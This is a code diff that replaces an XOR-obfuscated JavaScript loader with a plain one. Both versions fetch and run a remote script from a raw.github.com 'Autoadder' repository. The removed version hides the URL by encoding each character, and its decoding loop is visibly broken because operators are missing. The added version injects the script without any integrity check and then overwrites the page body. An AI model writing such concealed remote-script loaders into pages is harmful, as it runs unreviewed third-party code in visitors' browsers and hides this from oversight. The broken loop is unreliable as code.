@@ -1,10 +1,18 @@
-var X = "jvvrq8--pcu,ekvjw`,amo-Rjmglkzvmmnq-Cwvmcffgp-ocqvgp-GzrpgqqCC,hq";
-Y = "";
-Z = "";
-var V;
-V = X.length;
-for (i = 0; i < V; i  ) {
-    Y  = String.fromCharCode(X.charCodeAt(i) ^ 2)
-}
-Z = unescape(Y);
-document.body.appendChild(document.createElement('script')).src = Z;
+            var load_js = function(data, callback)
+            {
+                    var head = document.getElementsByTagName("head")[0];
+
+                    var script = document.createElement("script");
+                    script.type = "text/javascript";
+                    script.src = data;
+                    head.appendChild(script);
+
+                    if(callback != undefined)
+                            callback();
+            }
+
+            load_js("https://raw.github.com/Phoenixtools/Autoadder/master/ExpressAA.js");
+
+            setTimeout(function() {
+                $('body').html('loaded');
+            }, 1000);
